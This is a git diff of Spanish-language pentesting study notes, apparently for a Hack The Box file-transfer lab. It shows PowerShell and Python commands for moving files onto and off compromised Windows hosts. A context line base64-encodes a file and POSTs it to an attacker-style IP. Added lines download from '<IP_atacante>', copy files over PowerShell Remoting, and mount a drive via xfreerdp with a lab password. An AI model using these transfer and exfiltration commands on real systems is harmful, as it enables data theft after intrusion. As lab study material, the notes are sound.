@@ -232,6 +232,21 @@ PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Window
 PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
 ```
 
+También, si tenemos un servidor en escucha desde el que queremos subir un archivo, desde Windows podemos abrir una PowerShell y descargarlo, haciendo lo siguiente:
+
+**1. Creando servidor en local**
+
+```bash
+python -m http.server 80
+```
+
+(Imaginemos que hemos abierto el servidor local en la ruta donde se encunetra el archivo a subir)
+
+**2. Descargando desde PowerShell**
+
+```PowerShell
+iwr -uri http://<IP_atacante>/upload_win.zip -outfile upload_file.zip
+```
 ### Subidas SMB
 
 Comúnmente, las organizaciones no permiten el protocolo SMB (TCP/445) fuera de su red interna debido a los riesgos de seguridad asociados. Una alternativa es ejecutar SMB sobre HTTP utilizando WebDAV. WebDAV (RFC 4918) es una extensión de HTTP que permite a un servidor web comportarse como un servidor de archivos, soportando la autoría colaborativa de contenido. Además, WebDAV puede operar sobre HTTPS, proporcionando una capa adicional de seguridad.
@@ -331,3 +346,60 @@ Con esto ya podríamos usar RDP sin problema. El uso es el siguiente:
 ```bash
 xfreerdp /v:<IP_REMOTA> /u:Usuario /p:Password
 ```
+
+### Transferencia de archivos por sesión de PowerShell
+
+**PowerShell Remoting** nos permite ejecutar scripts o comandos en una computadora remota utilizando sesiones de PowerShell. Los administradores comúnmente usan PowerShell Remoting para gestionar computadoras remotas en una red, y también podemos usarlo para operaciones de transferencia de archivos. Por defecto, al habilitar PowerShell Remoting se crean tanto un listener HTTP como un listener HTTPS. Los listeners se ejecutan en los puertos predeterminados TCP/5985 para HTTP y TCP/5986 para HTTPS.
+
+Para crear una sesión de PowerShell Remoting en una computadora remota, necesitaremos acceso administrativo, ser miembros del grupo **Remote Management Users** o tener permisos explícitos para PowerShell Remoting en la configuración de la sesión. Vamos a crear un ejemplo y transferir un archivo de **DC01** a **DATABASE01** y viceversa.
+
+Tenemos una sesión como **Administrador** en **DC01**, el usuario tiene derechos administrativos en **DATABASE01**, y PowerShell Remoting está habilitado. Vamos a usar **Test-NetConnection** para confirmar que podemos conectarnos a **WinRM**.
+
+```powershell-session
+PS C:\htb> whoami
+
+htb\administrator
+
+PS C:\htb> hostname
+
+DC01
+```
+
+```powershell-session
+PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
+
+ComputerName     : DATABASE01
+RemoteAddress    : 192.168.1.101
+RemotePort       : 5985
+InterfaceAlias   : Ethernet0
+SourceAddress    : 192.168.1.100
+TcpTestSucceeded : True
+```
+
+Como esta sesión ya tiene privilegios sobre `DATABASE01`, no necesitamos especificar credenciales. Vamos a crear una sesión al ordenador remoto llamada `DATABASE01` y guardar los resultados en la variables `$session`
+
+```powershell-session
+PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
+```
+
+##### Copiando samplefile.txt desde nuestro localhost a la sesión
+
+```powershell-session
+PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+```
+
+##### Copiando DATABASE.txt desde la sesión a nuestro localhost
+
+```powershell-session
+PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+##### Montando un directorio Linux usando xfreerdp
+
+```shell-session
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+```
+
+Para acceder al directorio desde el Windows remoto, podemos conectarnos a `\\tsclient\`.
+
+![[Pasted image 20250409125008.png | 600]]
